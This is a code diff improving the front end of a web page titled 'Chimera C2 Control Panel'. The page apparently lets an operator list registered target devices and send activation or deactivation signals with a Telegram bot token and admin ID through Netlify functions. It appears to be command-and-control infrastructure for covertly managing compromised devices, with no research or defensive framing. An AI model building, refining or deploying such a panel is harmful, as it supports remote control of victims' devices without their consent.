@@ -5,27 +5,29 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Chimera C2 Control</title>
     <style>
-        body { font-family: sans-serif; background: #222; color: #eee; padding: 20px; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #1c1c1e; color: #f2f2f7; padding: 20px; margin: 0; }
         .container { max-width: 800px; margin: auto; }
-        .device { border: 1px solid #444; padding: 15px; margin-bottom: 10px; border-radius: 5px; }
-        h1, h2 { color: #00aaff; }
-        input, select, button { width: 100%; padding: 10px; margin-bottom: 10px; border-radius: 3px; border: 1px solid #555; background: #333; color: #eee; }
-        button { cursor: pointer; background: #00aaff; font-weight: bold; }
-        button.deactivate { background: #ff4400; }
-        #log { margin-top: 20px; padding: 10px; background: #111; border: 1px solid #333; height: 150px; overflow-y: scroll; white-space: pre-wrap; }
+        .card { background: #2c2c2e; border: 1px solid #3a3a3c; padding: 20px; margin-bottom: 20px; border-radius: 12px; }
+        h1, h2 { color: #0a84ff; border-bottom: 1px solid #3a3a3c; padding-bottom: 10px; }
+        input, select, button { width: 100%; padding: 12px; margin-bottom: 12px; border-radius: 8px; border: 1px solid #4a4a4c; background: #3a3a3c; color: #f2f2f7; box-sizing: border-box; font-size: 16px; }
+        button { cursor: pointer; background: #0a84ff; font-weight: bold; transition: background-color 0.2s; }
+        button:hover { background: #339cff; }
+        button.deactivate { background: #ff3b30; }
+        button.deactivate:hover { background: #ff6a63; }
+        #log { margin-top: 20px; padding: 15px; background: #111; border: 1px solid #333; height: 200px; overflow-y: scroll; white-space: pre-wrap; font-family: "SF Mono", "Fira Code", monospace; border-radius: 8px; }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>Chimera C2 Control Panel</h1>
         
-        <div class="device">
+        <div class="card">
             <h2>Configuration</h2>
-            <input type="text" id="botToken" placeholder="Enter Telegram Bot Token">
+            <input type="password" id="botToken" placeholder="Enter Telegram Bot Token">
             <input type="text" id="adminId" placeholder="Enter Your Telegram Admin ID">
         </div>
 
-        <div class="device">
+        <div class="card">
             <h2>Target Device</h2>
             <select id="deviceList"></select>
             <button onclick="activateDevice()">Activate Device</button>
@@ -36,28 +38,34 @@
     </div>
 
     <script>
-        const log = (message) => document.getElementById('log').textContent = message;
+        const log = (message, isError = false) => {
+            const logElement = document.getElementById('log');
+            logElement.textContent = message;
+            logElement.style.color = isError ? '#ff3b30' : '#f2f2f7';
+        };
 
         async function fetchDevices() {
             log('Fetching registered devices...');
             try {
                 const response = await fetch('/.netlify/functions/get-devices');
+                if (!response.ok) throw new Error(`Server responded with ${response.status}`);
                 const devices = await response.json();
                 const deviceList = document.getElementById('deviceList');
                 deviceList.innerHTML = '';
+
                 if (devices.length === 0) {
-                    deviceList.innerHTML = '<option>No devices registered yet</option>';
+                    deviceList.innerHTML = '<option value="">No devices registered yet</option>';
                 } else {
                     devices.forEach(device => {
                         const option = document.createElement('option');
                         option.value = device.deviceId;
-                        option.textContent = `${device.deviceName} (${device.deviceId.slice(0, 8)}...)`;
+                        option.textContent = `${device.deviceName} (ID: ...${device.deviceId.slice(-6)})`;
                         deviceList.appendChild(option);
                     });
                 }
-                log('Device list loaded.');
+                log('Device list loaded successfully.');
             } catch (error) {
-                log('Error fetching devices.');
+                log(`Error fetching devices: ${error.message}`, true);
             }
         }
 
@@ -67,30 +75,42 @@
             const adminId = document.getElementById('adminId').value;
 
             if (!deviceId || !botToken || !adminId) {
-                log('Please fill in all fields.');
+                log('Error: Bot Token, Admin ID, and a selected device are required.', true);
                 return;
             }
 
             log(`Sending activation signal to ${deviceId}...`);
-            const response = await fetch('/.netlify/functions/activate', {
-                method: 'POST',
-                body: JSON.stringify({ deviceId, botToken, adminId })
-            });
-            log(await response.text());
+            try {
+                const response = await fetch('/.netlify/functions/activate', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ deviceId, botToken, adminId })
+                });
+                const result = await response.text();
+                log(result, !response.ok);
+            } catch (error) {
+                log(`Network error: ${error.message}`, true);
+            }
         }
         
         async function deactivateDevice() {
             const deviceId = document.getElementById('deviceList').value;
             if (!deviceId) {
-                log('Please select a device.');
+                log('Error: Please select a device to deactivate.', true);
                 return;
             }
             log(`Sending deactivation signal to ${deviceId}...`);
-            const response = await fetch('/.netlify/functions/deactivate', {
-                method: 'POST',
-                body: JSON.stringify({ deviceId })
-            });
-            log(await response.text());
+            try {
+                const response = await fetch('/.netlify/functions/deactivate', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ deviceId })
+                });
+                const result = await response.text();
+                log(result, !response.ok);
+            } catch (error) {
+                log(`Network error: ${error.message}`, true);
+            }
         }
 
         window.onload = fetchDevices;
